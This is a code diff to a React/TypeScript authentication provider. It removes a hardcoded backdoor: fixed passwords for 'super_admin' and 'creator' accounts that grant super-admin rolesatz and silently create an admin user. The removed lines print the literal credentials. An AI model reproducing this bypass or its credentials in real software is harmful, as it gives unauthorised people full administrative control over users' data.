@@ -461,39 +461,19 @@ export function AuthProvider({ children }: { children: ReactNode }) {
             isPassMatch = (password === localUser.passwordHash);
           }
         }
-        if (!isPassMatch && (cleanUser === 'super_admin' || cleanUser === 'creator')) {
-          isPassMatch = (password === 'july94bab' || password === 'admin123');
-        }
 
         if (isPassMatch) {
           const updatedUser: User = {
             ...localUser,
-            role: (cleanUser === 'super_admin' || cleanUser === 'creator') ? 'super_admin' : localUser.role,
             lastLogin: Date.now()
           };
           if (localUser.id) {
-            await db.users.update(localUser.id, { lastLogin: Date.now(), role: updatedUser.role });
+            await db.users.update(localUser.id, { lastLogin: Date.now() });
           }
           setUser(updatedUser);
           localStorage.setItem('esepa_user', JSON.stringify(updatedUser));
           return { success: true, user: updatedUser };
         }
-      } else if ((cleanUser === 'super_admin' || cleanUser === 'creator') && (password === 'july94bab' || password === 'admin123')) {
-        const creatorUser: User = {
-          username: cleanUser,
-          fullName: 'Super Administrator',
-          role: 'super_admin',
-          status: 'active',
-          createdAt: Date.now(),
-          lastLogin: Date.now()
-        };
-        try {
-          const newId = await db.users.add(creatorUser);
-          creatorUser.id = newId as number;
-        } catch (e) {}
-        setUser(creatorUser);
-        localStorage.setItem('esepa_user', JSON.stringify(creatorUser));
-        return { success: true, user: creatorUser };
       }
     } catch (localErr) {}
 
